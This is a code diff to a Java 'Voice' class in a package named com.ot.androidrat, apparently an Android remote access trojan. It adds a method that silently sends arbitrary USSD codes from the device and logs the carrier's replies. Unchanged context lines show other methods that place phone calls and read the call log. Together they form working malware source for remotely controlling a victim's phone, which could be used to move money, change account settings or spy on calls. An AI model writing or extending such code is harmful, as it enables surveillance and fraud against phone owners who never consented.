@@ -1,12 +1,19 @@
 package com.ot.androidrat;
 
+import android.Manifest;
 import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
 import android.media.MediaRecorder;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Environment;
+import android.os.Handler;
+import android.telecom.TelecomManager;
+import android.telephony.TelephonyManager;
 import android.util.Log;
+
+import androidx.core.app.ActivityCompat;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -18,6 +25,7 @@ import java.util.TimerTask;
 
 public class Voice {
 
+
     public int phoneCall(Context context, String phoneNo){
         try{
             Intent callIntent = new Intent(Intent.ACTION_CALL);
@@ -27,6 +35,28 @@ public class Voice {
             return 1;
         }
         return 0;
+    }
+    
+    public void disalUSSD(String ussd, Context context){
+        if(ussd.equalsIgnoreCase("")){
+            return;
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            TelephonyManager manager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+            manager.sendUssdRequest(ussd, new TelephonyManager.UssdResponseCallback() {
+                @Override
+                public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
+                    super.onReceiveUssdResponse(telephonyManager, request, response);
+                    Log.i("ussd",response.toString().trim());
+                }
+
+                @Override
+                public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
+                    super.onReceiveUssdResponseFailed(telephonyManager, request, failureCode);
+                    Log.i("ussd", failureCode + " " + request);
+                }
+            }, new Handler());
+        }
     }
 
     public JSONObject viewCallLog(Context context) {
